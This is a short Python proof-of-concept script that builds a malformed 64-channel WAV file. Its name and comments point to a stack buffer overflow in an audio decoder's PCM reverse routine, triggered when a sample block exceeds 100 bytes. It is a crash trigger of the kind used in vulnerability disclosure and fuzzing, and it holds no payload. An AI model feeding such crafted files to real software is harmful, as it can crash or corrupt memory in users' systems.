#!/usr/bin/env python3
import struct

def make_wav(path="poc_rfpcm_reverse_stack_overflow.wav",
             channels=64, sample_rate=44100, bits_per_sample=16,
             num_samples=1024):
    assert bits_per_sample in (8, 16, 24, 32, 64)
    bps = bits_per_sample // 8
    block_align = channels * bps
    byte_rate = sample_rate * block_align

    # num_samples is per-channel samples
    data_size = num_samples * block_align
    data = b"\x00" * data_size

    fmt_chunk = struct.pack(
        "<4sIHHIIHH",
        b"fmt ", 16,          # chunk id + size
        1,                    # audio format = PCM
        channels,
        sample_rate,
        byte_rate,
        block_align,
        bits_per_sample
    )
    data_chunk = struct.pack("<4sI", b"data", data_size) + data

    riff_size = 4 + len(fmt_chunk) + len(data_chunk)  # "WAVE" + chunks
    header = struct.pack("<4sI4s", b"RIFF", riff_size, b"WAVE")

    with open(path, "wb") as f:
        f.write(header)
        f.write(fmt_chunk)
        f.write(data_chunk)

    print("[+] wrote", path)
    print("    channels =", channels)
    print("    bps      =", bits_per_sample)
    print("    bytes/sample(all channels) =", channels * (bits_per_sample // 8), " (must > 100)")

if __name__ == "__main__":
    make_wav()
